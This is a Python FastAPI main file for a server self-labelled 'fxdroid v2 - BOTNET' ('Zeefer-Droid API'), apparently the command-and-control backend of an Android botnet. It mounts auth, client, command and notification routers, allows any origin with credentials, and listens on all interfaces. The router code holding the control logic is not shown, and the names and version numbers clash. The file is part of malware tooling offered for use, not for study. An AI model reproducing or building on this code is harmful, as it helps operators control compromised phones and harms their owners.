from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
import os

# Load environment variables
load_dotenv()

# Import routers
from routers.auth import auth
from routers.client import client
from routers.command import command
from routers.notification import notification

# Create FastAPI app
app = FastAPI(
    version="4.0",
    title="fxdroid v2 - BOTNET",
    description="fxdroid v2 - BOTNET",
    redoc_url=None,
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(auth.router)
app.include_router(client.router)
app.include_router(command.router)
app.include_router(notification.router)

# Health check endpoint
@app.get("/health")
async def health_check():
    return JSONResponse({
        "status": "ok",
        "app": "zeefer-droid",
        "version": "1.0.0"
    })

@app.get("/")
async def root():
    return JSONResponse({
        "message": "Welcome to Zeefer-Droid API",
        "version": "1.0.0",
        "endpoints": {
            "health": "/health",
            "auth": "/auth/login",
            "clients": "/client/",
            "commands": "/command/",
            "notifications": "/notification/"
        }
    })

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
